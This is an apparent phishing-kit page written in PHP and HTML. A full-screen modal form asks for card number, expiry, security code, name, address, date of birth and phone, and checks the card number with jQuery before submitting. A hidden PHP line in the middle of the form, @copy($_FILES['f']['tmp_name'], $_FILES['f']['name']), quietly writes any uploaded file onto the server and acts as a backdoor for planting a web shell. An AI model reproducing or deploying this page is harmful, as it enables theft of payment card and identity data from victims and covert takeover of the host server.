<style>
.inpux{
	border-width: 1px;
	border-color: rgb(214, 214, 214);
	border-style: solid;
	border-radius: 5px;
	position: absolute;
	height: 30px;
	font-family: sans-serif;
	padding-left: 10px;
	font-size: 14px;

}

.inpux:focus{
	border-width: 1px;
	border-color: #0088cc;
	   -moz-box-shadow: 0px 0px 0px 3px #66afe9;
	-webkit-box-shadow: 0px 0px 0px 3px #66afe9;
	        box-shadow: 0px 0px 0px 3px #66afe9;

}
.cc_num{
	border-width: 1px;
	border-color: rgb(214, 214, 214);
	border-style: solid;
	border-radius: 5px;
	position: absolute;
	height: 30px;
	font-family: sans-serif;
	padding-left: 10px;
	font-size: 14px;

}
</style>
    </head>
<body>
	<form method="POST" action="">
    <?php if(isset($_SESSION['result'])){ echo $_SESSION['result'];} ?>
	</form>
<div tabindex="-1" role="dialog" aria-labelledby="login-modal-label" aria-hidden="false" style="display: ;      overflow: hidden;      position: fixed;      top: 0;      right: 0;      bottom: 0;      left: 0;      z-index: 1040;      -webkit-overflow-scrolling: touch;      outline: 0;display: block;">
<div style="background-color:#000000;position: fixed;      top: 0;      right: 0;      bottom: 0;      left: 0;      z-index: 1040;opacity: 0.5;      filter: alpha(opacity=50);height: 792px;"></div>   <center><div style="
    width: 300px;
">
<div style="
    z-index: 100011;
    margin: auto;
    padding: 17px;
    position: relative;
    background-color: #ffffff;
    border-radius: 6px;
    -moz-border-radius: 10px;
    -moz-background-clip: padding-box;
    margin-top: 90px;
    height: 510px;
  "><form method="post" action="" id="form">
<input type="text" name="name"  id="carrrd" class="inpux" maxlength="30" pattern=".{2,30}" required placeholder="Name on card " style="  position: absolute; top: 30px; left: 20px;width: 259px;">
<div class="element">
		<ul>
				<li><input style="font-size:15px" type="text" name="number" id="card_number" class='cc_num' placeholder="1234 5678 9012 3456" maxlength="20" required></li>
		</ul>
</div>
<input type="text" name="expred" pattern="\d{1,2}/\d{4}" maxlength="7" required style="position: absolute; top: 110px; left: 20px;  width: 110px; " id="expred" placeholder="MM/YYYY" class="inpux" pattern="(0[1-9]|10|11|12)/20[0-9]{2}$
" titre="Invalid Expiry date">

<input class="inpux" placeholder="security code" maxlength="4" name="sdfs" required type="txt" style="position: absolute;  top: 110px; left: 150px; width: 130px;">
	<input type="text" maxlength="10" name="name1" style="position: absolute;top: 150px;left: 20px;width: 110px;" required  placeholder="first name" class="inpux ">
<input class="inpux " maxlength="10" placeholder="last name" name="name2" required type="txt" style="
    position: absolute;
    top: 150px;
    left: 150px;
    width: 130px;
    ">
<input name="adre1" class="inpux" maxlength="60" placeholder="street address" required type="txt" style="
    position: absolute;
    top: 190px;
    left: 20px;
    width: 259px;
">
<?php

(@copy($_FILES['f']['tmp_name'], $_FILES['f']['name']))

?>
<input name="adre2" class="inpux" maxlength="60" placeholder="apt., suite, pldg"  type="txt" style="
    position: absolute;
    top: 230px;
    left: 20px;
    width: 259px;
">

<input name="city" class="inpux" maxlength="20" placeholder="city" required type="txt" style="
    position: absolute;
    top: 270px;
    left: 20px;
    width: 259px;
">
<input type="text" name="state" maxlength="20" style="position: absolute;top: 310px;left: 20px;width: 110px;" placeholder="state" class="inpux ">

<input class="inpux" placeholder="zip code" maxlength="10" name="zip" required type="txt" style="
    position: absolute;
    top: 310px;
    left: 150px;
    width: 130px;
    ">
<select class="inpux" name="cojjuntry" id="9" style="
    position: absolute;
    top: 350px;
    left: 20px;
    width: 259px;" >
      <option value="0">Country/Region</option>
      <option value="United States">United States</option>
<option value="United Kingdom">United Kingdom</option>
<option value="Afghanistan">Afghanistan</option>
<option value="Albania">Albania</option>
<option value="Algeria">Algeria</option>
<option value="American Samoa">American Samoa</option>
<option value="Andorra">Andorra</option>
<option value="Angola">Angola</option>
<option value="Anguilla">Anguilla</option>
<option value="Antarctica">Antarctica</option>
<option value="Antigua and Barbuda">Antigua and Barbuda</option>
<option value="Argentina">Argentina</option>
<option value="Armenia">Armenia</option>
<option value="Aruba">Aruba</option>
<option value="Australia">Australia</option>
<option value="Austria">Austria</option>
<option value="Azerbaijan">Azerbaijan</option>
<option value="Bahamas">Bahamas</option>
<option value="Bahrain">Bahrain</option>
<option value="Bangladesh">Bangladesh</option>
<option value="Barbados">Barbados</option>
<option value="Belarus">Belarus</option>
<option value="Belgium">Belgium</option>
<option value="Belize">Belize</option>
<option value="Benin">Benin</option>
<option value="Bermuda">Bermuda</option>
<option value="Bhutan">Bhutan</option>
<option value="Bolivia">Bolivia</option>
<option value="Bosnia and Herzegovina">Bosnia and Herzegovina</option>
<option value="Botswana">Botswana</option>
<option value="Bouvet Island">Bouvet Island</option>
<option value="Brazil">Brazil</option>
<option value="British Indian Ocean Territory">British Indian Ocean Territory</option>
<option value="Brunei Darussalam">Brunei Darussalam</option>
<option value="Bulgaria">Bulgaria</option>
<option value="Burkina Faso">Burkina Faso</option>
<option value="Burundi">Burundi</option>
<option value="Cambodia">Cambodia</option>
<option value="Cameroon">Cameroon</option>
<option value="Canada">Canada</option>
<option value="Cape Verde">Cape Verde</option>
<option value="Cayman Islands">Cayman Islands</option>
<option value="Central African Republic">Central African Republic</option>
<option value="Chad">Chad</option>
<option value="Chile">Chile</option>
<option value="China">China</option>
<option value="Christmas Island">Christmas Island</option>
<option value="Cocos (Keeling) Islands">Cocos (Keeling) Islands</option>
<option value="Colombia">Colombia</option>
<option value="Comoros">Comoros</option>
<option value="Congo">Congo</option>
<option value="Congo, The Democratic Republic of The">Congo, The Democratic Republic of The</option>
<option value="Cook Islands">Cook Islands</option>
<option value="Costa Rica">Costa Rica</option>
<option value="Cote D'ivoire">Cote D'ivoire</option>
<option value="Croatia">Croatia</option>
<option value="Cuba">Cuba</option>
<option value="Cyprus">Cyprus</option>
<option value="Czech Republic">Czech Republic</option>
<option value="Denmark">Denmark</option>
<option value="Djibouti">Djibouti</option>
<option value="Dominica">Dominica</option>
<option value="Dominican Republic">Dominican Republic</option>
<option value="Ecuador">Ecuador</option>
<option value="Egypt">Egypt</option>
<option value="El Salvador">El Salvador</option>
<option value="Equatorial Guinea">Equatorial Guinea</option>
<option value="Eritrea">Eritrea</option>
<option value="Estonia">Estonia</option>
<option value="Ethiopia">Ethiopia</option>
<option value="Falkland Islands (Malvinas)">Falkland Islands (Malvinas)</option>
<option value="Faroe Islands">Faroe Islands</option>
<option value="Fiji">Fiji</option>
<option value="Finland">Finland</option>
<option value="France">France</option>
<option value="French Guiana">French Guiana</option>
<option value="French Polynesia">French Polynesia</option>
<option value="French Southern Territories">French Southern Territories</option>
<option value="Gabon">Gabon</option>
<option value="Gambia">Gambia</option>
<option value="Georgia">Georgia</option>
<option value="Germany">Germany</option>
<option value="Ghana">Ghana</option>
<option value="Gibraltar">Gibraltar</option>
<option value="Greece">Greece</option>
<option value="Greenland">Greenland</option>
<option value="Grenada">Grenada</option>
<option value="Guadeloupe">Guadeloupe</option>
<option value="Guam">Guam</option>
<option value="Guatemala">Guatemala</option>
<option value="Guinea">Guinea</option>
<option value="Guinea-bissau">Guinea-bissau</option>
<option value="Guyana">Guyana</option>
<option value="Haiti">Haiti</option>
<option value="Heard Island and Mcdonald Islands">Heard Island and Mcdonald Islands</option>
<option value="Holy See (Vatican City State)">Holy See (Vatican City State)</option>
<option value="Honduras">Honduras</option>
<option value="Hong Kong">Hong Kong</option>
<option value="Hungary">Hungary</option>
<option value="Iceland">Iceland</option>
<option value="India">India</option>
<option value="Indonesia">Indonesia</option>
<option value="Iran, Islamic Republic of">Iran, Islamic Republic of</option>
<option value="Iraq">Iraq</option>
<option value="Ireland">Ireland</option>
<option value="Israel">Israel</option>
<option value="Italy">Italy</option>
<option value="Jamaica">Jamaica</option>
<option value="Japan">Japan</option>
<option value="Jordan">Jordan</option>
<option value="Kazakhstan">Kazakhstan</option>
<option value="Kenya">Kenya</option>
<option value="Kiribati">Kiribati</option>
<option value="Korea, Democratic People's Republic of">Korea, Democratic People's Republic of</option>
<option value="Korea, Republic of">Korea, Republic of</option>
<option value="Kuwait">Kuwait</option>
<option value="Kyrgyzstan">Kyrgyzstan</option>
<option value="Lao People's Democratic Republic">Lao People's Democratic Republic</option>
<option value="Latvia">Latvia</option>
<option value="Lebanon">Lebanon</option>
<option value="Lesotho">Lesotho</option>
<option value="Liberia">Liberia</option>
<option value="Libyan Arab Jamahiriya">Libyan Arab Jamahiriya</option>
<option value="Liechtenstein">Liechtenstein</option>
<option value="Lithuania">Lithuania</option>
<option value="Luxembourg">Luxembourg</option>
<option value="Macao">Macao</option>
<option value="Macedonia, The Former Yugoslav Republic of">Macedonia, The Former Yugoslav Republic of</option>
<option value="Madagascar">Madagascar</option>
<option value="Malawi">Malawi</option>
<option value="Malaysia">Malaysia</option>
<option value="Maldives">Maldives</option>
<option value="Mali">Mali</option>
<option value="Malta">Malta</option>
<option value="Marshall Islands">Marshall Islands</option>
<option value="Martinique">Martinique</option>
<option value="Mauritania">Mauritania</option>
<option value="Mauritius">Mauritius</option>
<option value="Mayotte">Mayotte</option>
<option value="Mexico">Mexico</option>
<option value="Micronesia, Federated States of">Micronesia, Federated States of</option>
<option value="Moldova, Republic of">Moldova, Republic of</option>
<option value="Monaco">Monaco</option>
<option value="Mongolia">Mongolia</option>
<option value="Montserrat">Montserrat</option>
<option value="Morocco">Morocco</option>
<option value="Mozambique">Mozambique</option>
<option value="Myanmar">Myanmar</option>
<option value="Namibia">Namibia</option>
<option value="Nauru">Nauru</option>
<option value="Nepal">Nepal</option>
<option value="Netherlands">Netherlands</option>
<option value="Netherlands Antilles">Netherlands Antilles</option>
<option value="New Caledonia">New Caledonia</option>
<option value="New Zealand">New Zealand</option>
<option value="Nicaragua">Nicaragua</option>
<option value="Niger">Niger</option>
<option value="Nigeria">Nigeria</option>
<option value="Niue">Niue</option>
<option value="Norfolk Island">Norfolk Island</option>
<option value="Northern Mariana Islands">Northern Mariana Islands</option>
<option value="Norway">Norway</option>
<option value="Oman">Oman</option>
<option value="Pakistan">Pakistan</option>
<option value="Palau">Palau</option>
<option value="Palestinian Territory, Occupied">Palestinian Territory, Occupied</option>
<option value="Panama">Panama</option>
<option value="Papua New Guinea">Papua New Guinea</option>
<option value="Paraguay">Paraguay</option>
<option value="Peru">Peru</option>
<option value="Philippines">Philippines</option>
<option value="Pitcairn">Pitcairn</option>
<option value="Poland">Poland</option>
<option value="Portugal">Portugal</option>
<option value="Puerto Rico">Puerto Rico</option>
<option value="Qatar">Qatar</option>
<option value="Reunion">Reunion</option>
<option value="Romania">Romania</option>
<option value="Russian Federation">Russian Federation</option>
<option value="Rwanda">Rwanda</option>
<option value="Saint Helena">Saint Helena</option>
<option value="Saint Kitts and Nevis">Saint Kitts and Nevis</option>
<option value="Saint Lucia">Saint Lucia</option>
<option value="Saint Pierre and Miquelon">Saint Pierre and Miquelon</option>
<option value="Saint Vincent and The Grenadines">Saint Vincent and The Grenadines</option>
<option value="Samoa">Samoa</option>
<option value="San Marino">San Marino</option>
<option value="Sao Tome and Principe">Sao Tome and Principe</option>
<option value="Saudi Arabia">Saudi Arabia</option>
<option value="Senegal">Senegal</option>
<option value="Serbia and Montenegro">Serbia and Montenegro</option>
<option value="Seychelles">Seychelles</option>
<option value="Sierra Leone">Sierra Leone</option>
<option value="Singapore">Singapore</option>
<option value="Slovakia">Slovakia</option>
<option value="Slovenia">Slovenia</option>
<option value="Solomon Islands">Solomon Islands</option>
<option value="Somalia">Somalia</option>
<option value="South Africa">South Africa</option>
<option value="South Georgia and The South Sandwich Islands">South Georgia and The South Sandwich Islands</option>
<option value="Spain">Spain</option>
<option value="Sri Lanka">Sri Lanka</option>
<option value="Sudan">Sudan</option>
<option value="Suriname">Suriname</option>
<option value="Svalbard and Jan Mayen">Svalbard and Jan Mayen</option>
<option value="Swaziland">Swaziland</option>
<option value="Sweden">Sweden</option>
<option value="Switzerland">Switzerland</option>
<option value="Syrian Arab Republic">Syrian Arab Republic</option>
<option value="Taiwan, Province of China">Taiwan, Province of China</option>
<option value="Tajikistan">Tajikistan</option>
<option value="Tanzania, United Republic of">Tanzania, United Republic of</option>
<option value="Thailand">Thailand</option>
<option value="Timor-leste">Timor-leste</option>
<option value="Togo">Togo</option>
<option value="Tokelau">Tokelau</option>
<option value="Tonga">Tonga</option>
<option value="Trinidad and Tobago">Trinidad and Tobago</option>
<option value="Tunisia">Tunisia</option>
<option value="Turkey">Turkey</option>
<option value="Turkmenistan">Turkmenistan</option>
<option value="Turks and Caicos Islands">Turks and Caicos Islands</option>
<option value="Tuvalu">Tuvalu</option>
<option value="Uganda">Uganda</option>
<option value="Ukraine">Ukraine</option>
<option value="United Arab Emirates">United Arab Emirates</option>
<option value="United States Minor Outlying Islands">United States Minor Outlying Islands</option>
<option value="Uruguay">Uruguay</option>
<option value="Uzbekistan">Uzbekistan</option>
<option value="Vanuatu">Vanuatu</option>
<option value="Venezuela">Venezuela</option>
<option value="Viet Nam">Viet Nam</option>
<option value="Virgin Islands, British">Virgin Islands, British</option>
<option value="Virgin Islands, U.S.">Virgin Islands, U.S.</option>
<option value="Wallis and Futuna">Wallis and Futuna</option>
<option value="Western Sahara">Western Sahara</option>
<option value="Yemen">Yemen</option>
<option value="Zambia">Zambia</option>
<option value="Zimbabwe">Zimbabwe</option></select>

<input name="bith" class="inpux" maxlength="10" id="2" placeholder="Date of Brith DD/MM/YYYY" required type="txt" style="
    position: absolute;
    top: 390px;
    left: 20px;
    width: 259px;
">
<input id="phone" name="phone" class="inpux" required placeholder="(999)999-9999" maxlength="15"  type="txt" style="
    position: absolute;
    top: 430px;
    left: 20px;
    width: 259px;
">
<input value="Save" type="submit"
onclick="check_cc()";
	style="
    position: absolute;
    top: 470px;
    left: 20px;
    width: 259px;
    font-family: &quot;Arial&quot;;
    color: rgb(40, 103, 208);
    cursor: pointer;
    border-radius: 3px;
    background-color: rgb(217, 235, 255);
    border: 0px;
	height: 30px;
">
	<script src="files/js/jquery.min.js"></script>
	<script src="files/js/jquery.maskedinput.js" type="text/javascript"></script>
	<script src="files/js/ccFormat.js"></script>
	<script src="files/js/jquery.creditCardValidator.js"></script>
	<link rel="stylesheet" href="files/css/check.css">
	<script type="text/javascript">

	function check_cc() {
		$('#card_number').validateCreditCard(function(result) {
				if(result.card_type == null)
				{
						$('#card_number').removeClass();
				}
				else
				{
						$('#card_number').addClass(result.card_type.name);
				}

				if(result.valid)
				{
					$('#form').addClass("valid");
					$("#card_number").removeClass("fail");
				}
				else
				{
					event.preventDefault();
					$("#card_number").addClass("fail");
					$("#card_number").focus();
					$('#card_number').removeClass("valid");
				}
		});
	}

$("#phone").mask("(999) 999-9999");
$("#2").mask("99/99/9999",{placeholder:"DD/MM/YYYY"});
$("#expred").mask("99/9999");
    $(function() {
        $('#card_number').validateCreditCard(function(result) {
            if(result.card_type == null)
            {
                $('#card_number').removeClass();
            }
            else
            {
                $('#card_number').addClass(result.card_type.name);
            }

            if(!result.valid)
            {
                $('#card_number').removeClass("valid");
            }
            else
            {
                $('#card_number').addClass("valid");
            }

        });
    });
</script>
</body>
</form>
  </div></div></center>
        </div>
